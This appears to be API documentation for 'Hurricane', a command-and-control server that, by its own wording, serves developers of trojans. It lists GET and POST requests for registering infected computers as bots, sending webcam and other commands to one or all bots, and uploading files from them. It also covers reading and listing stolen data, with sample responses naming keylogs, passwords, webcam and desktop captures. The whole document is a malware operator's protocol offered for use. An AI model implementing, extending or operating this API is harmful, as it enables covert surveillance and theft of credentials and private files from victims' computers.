# [Hurricane - API 1.0]

`Warning, please do not use special characters in the request, otherwise it will be blocked.`

###### SERVER TIME:
**GET REQUEST:** _httр://host/api.php?server_time_
```json
{
   "status":"Success",
   "message":"Server time recived",
   "year":"2019",
   "month":"12",
   "day":"10",
   "hour":"11",
   "minute":"31",
   "secound":"17"
}
```

######  REMOTE IP:
**GET REQUEST:** _httр://host/api.php?remote_ip_
```json
{
   "status":"Success",
   "message":"Remote ip recived",
   "ip":"XXX.XXX.XXX.XXX"
}

```
###### GENERATE RANDOM UUID:
**GET REQUEST:** _httр://host/api.php?generate_uuid_
```json
{
   "status":"Success",
   "message":"Random uuid4 has been generated",
   "uuid":"0d94a079-07dd-4409-a30d-a4f49bb33975"
}

```
###### SERVER STATUS:
**GET REQUEST:** _httр://host/api.php?server_status_
```json
{
   "status":"Success",
   "message":"Server status here",
   "processor":"17.1",
   "virtual_memory":"36.4",
   "disk_usage":"46.0"
}
```

#### THESE COMMANDS ARE NEEDED FOR THE DEVELOPERS OF THEIR TROJANS:
> Warning! You need set you username and token in request
> You can get you token in Remote Access Terminal. Just execute command 'token'

`host`         This is ip of STK server  
`username`     This is you account username on STK server.  
`token`        This is you account token    on STK server.  
`bot_uuid`     This is randomly generated uuid  

###### CREATE BOT:
> `bot_username`     This is the username of the bot on the infected computer.  
> `bot_computername` This is the computername of the bot on the infected computer.  

**GET REQUEST:** _httр://host/api.php?profile=username&token=TOKEN&bot_uuid=BOT_UUID&bot_username=BOT_USERNAME&bot_computername=BOT_COMPUTERNAME&create_user_
```json
{
   "status":"Success",
   "message":"Bot 0d94a079-07dd-4409-a30d-a4f49bb33975 created!",
   "value":true
}
```

###### DELETE BOT:
> Delete bot from database and folder.

**GET REQUEST:** _httр://host/api.php?profile=PROFILE&token=TOKEN&bot_uuid=BOT_UUID&rmbot_
```json
{
   "status":"Success",
   "message":"Bot 0d94a079-07dd-4409-a30d-a4f49bb33975 removed!",
   "value":true
}
```

###### CHECK BOT:
**GET REQUEST:** _httр://host/api.php?profile=PROFILE&token=TOKEN&bot_uuid=BOT_UUID&check_user_
```json
{
   "status":"Success",
   "message":"User: 0d94a079-07dd-4409-a30d-a4f49bb33975 directory found",
   "value":true
}
```


###### SEND COMMAND TO BOT:
**GET REQUEST:** _httр://host/api.php?profile=PROFILE&token=TOKEN&bot_uuid=BOT_UUID&command=webcam&arguments="arg1", "arg2", "...."_
```json
{
   "status":"Success",
   "message":"Bot '0d94a079-07dd-4409-a30d-a4f49bb33975' received new local command 'webcam' with arguments '/"arg1/", /"arg2/", /"..../"'",
   "value":true
}
```

###### SEND GLOBAL COMMAND TO ALL BOTS:
**GET REQUEST:** _httр://host/api.php?profile=PROFILE&token=TOKEN&bot_uuid=BOT_UUID&global_command=webcam&arguments="arg1", "arg2", "...."_
```json
{
   "status":"Success",
   "message":"Bot '0d94a079-07dd-4409-a30d-a4f49bb33975' received new local command 'webcam' with arguments '/"arg1/", /"arg2/", /"..../"'",
   "value":true
}
```

###### CHECK FOR COMMANDS:
**GET REQUEST:** _httр://host/api.php?profile=PROFILE&token=TOKEN&bot_uuid=BOT_UUID&commands_
```json
{
   "status":"Success",
   "message":"GETCOMMAND: New command detected!",
   "value":true,
   "main":{
      "command":"webcam",
      "arguments":[
         "arg1",
         "arg2",
         "...."
      ],
      "type":"local"
   }
}
```

###### ADD LOCAL RESPONSE DATA TO BOT:
>  If you repeat it, the old line will not be overwritten.  
> `response` This is a data line. Which is stored on the server.  
> `type`     May be 'local'. Data string will be stored on your bot.  

**GET REQUEST:** _httр://host/api.php?profile=PROFILE&token=TOKEN&bot_uuid=BOT_UUID&response=Here is response data to bot&type=local_
```json
{
   "status":"Success",
   "message":"local response data saved",
   "value":true
}

```
###### ADD GLOBAL RESPONSE DATA TO STK USER:
>  If you repeat it, the old line will not be overwritten.  
> `response` This is a data line. Which is stored on the server.  
> `type`     If 'global'. Data string will be stored on your account.  

**GET REQUEST:** _httр://host/api.php?profile=PROFILE&token=TOKEN&response=Here is response data to bot&type=global_
```json
{
   "status":"Success",
   "message":"global response data saved",
   "value":true
}
```

###### GET LOCAL RESPONSE DATA FROM BOT:
> Attention! After executing the request, the line will be deleted from the server!

**GET REQUEST:** _httр://host/api.php?profile=PROFILE&token=TOKEN&bot_uuid=BOT_UUID&type=local&get_response_
```json
{
   "status":"Success",
   "message":"local response data here",
   "value":true,
   "response":"Here is response data to bot"
}
```

###### GET GLOBAL RESPONSE DATA FROM ACCOUNT:
> Attention! After executing the request, the line will be deleted from the server!

**GET REQUEST:** _httр://host/api.php?profile=PROFILE&token=TOKEN&type=global&get_response_
```json
{
   "status":"Success",
   "message":"global response data here",
   "value":true,
   "response":"Here is global response"
}
```

###### UPLOAD FILE TO USER FOLDER:
>  Example python code to upload file: https://pastebin.com/0gteFain  
>  File will be saved in folder: /users/`profile`/`bot_uuid`/file.txt  
 
**POST REQUEST WITH FILE:** _httр://host/api.php?profile=PROFILE&token=TOKEN&bot_uuid=BOT_UUID&upload_
```json
{
   "status":"Success",
   "message":"File uploaded successfully!",
   "value":true,
   "path":"/var/www/html/users/LimerBoy/Admin@WIN-55TC7FCB9AT/",
   "debug":{
      "files":{
         "name":"screenshot.png",
         "type":"",
         "tmp_name":"/tmp/phpxdgd67",
         "error":0,
         "size":317270
      }
   }
}
```

###### READ FILES FROM YOU DIRECTORY:
> For example we read uploaded file by bot. In her directory.

**GET REQUEST:** _httр://host/api.php?profile=PROFILE&token=TOKEN&read_file=BOT_UUID/keylogs.txt_
```json
{
   "status":"Success",
   "message":"Reading file: 0d94a079-07dd-4409-a30d-a4f49bb33975/keylogs.txt",
   "value":true,
   "file":[
      "Hello!!/r",
      "LLALALALAALALAL/r",
      "IT'S BACKDOOR AAAAasdasder3wesd/r",
      "dgs/r",
      "fds/r",
      "gfg/r",
      "fgfd3/t2"
   ]
}
```

###### GET FILES LIST FROM BOT DIRECTORY:
**GET REQUEST:** _httр://host/api.php?profile=PROFILE&token=TOKEN&bot_uuid=BOT_UUID&ls_
```json
{
   "status":"Success",
   "message":"Here your files list!",
   "files":[
      "keylogs.txt",
      "desktop.png",
      "webcam.png",
      "passwords.txt"
   ]
}
```

###### REMOVE FILE FROM BOT DIRECTORY:
**GET REQUEST:** _httр://host/api.php?profile=PROFILE&token=TOKEN&bot_uuid=BOT_UUID&rm=file_
```json
{
   "status":"Success",
   "message":"File removed",
   "value":true
}
```

###### GET FILE HASH(md5) FROM BOT DIRECTORY:
**GET REQUEST:** _httр://host/api.php?profile=PROFILE&token=TOKEN&md5=users/profile/bot_uuid/passwords.txt_
```json
{
   "status":"Success",
   "message":"File hash found!",
   "hash":"8aa7118dad83623f5c78f2e2a0291c60",
   "path":"users/LimerBoy/0d94a079-07dd-4409-a30d-a4f49bb33975/passwords.txt",
   "value":true
}
```

###### GET MY BOTS:
> `login_password` It a password from account  

**GET REQUEST:** _httр://host/api.php?profile=PROFILE&token=TOKEN&login_password=PASSWORD&get_my_users_
```json
{
   "status":"Success",
   "message":"Loading you users list.",
   "value":true,
   "users":[
      {
         "uuid":"0d94a079-07dd-4409-a30d-a4f49bb33975",
         "username":"lalalalala",
         "computername":"lililili",
         "remote_ip":"XXX.XXX.XXX.XXX",
         "last_time":"11:56 10.12.2019"
      },
      {
         "uuid":"24sda943-09ad-fds3-a20d-a4f4sdb2975",
         "username":"Admin",
         "computername":"PC",
         "remote_ip":"XXX.XXX.XXX.XXX",
         "last_time":"10:50 9.10.2019"
      }
   ]
}
```


### Other commands
###### LOGIN:
> `login_username` It a username from account  
> `login_password` It a password from account  
>  
> `status codes:`  
>  1 - Logged in  
>  2 - Wrong passwords  
>  3 - User not found  

**GET REQUEST:** _httр://host/scripts/database.php?login_username=USERNAME&login_password=PASSWORD&login_
```json
{
   "message":"Logged in.",
   "status":1
}
```

###### GET TOKEN BY LOGIN AND PASSWORD:
> `login_username` It a username from account  
> `login_password` It a password from account  

**GET REQUEST:** _httр://host/scripts/database.php?login_username=USERNAME&login_password=PASSWORD&getToken_
```json
{
   "message":"Login and Password is correct. Token is here",
   "token":"ACCOUNT-SECRET-TOKEN",
   "value":true
}
```
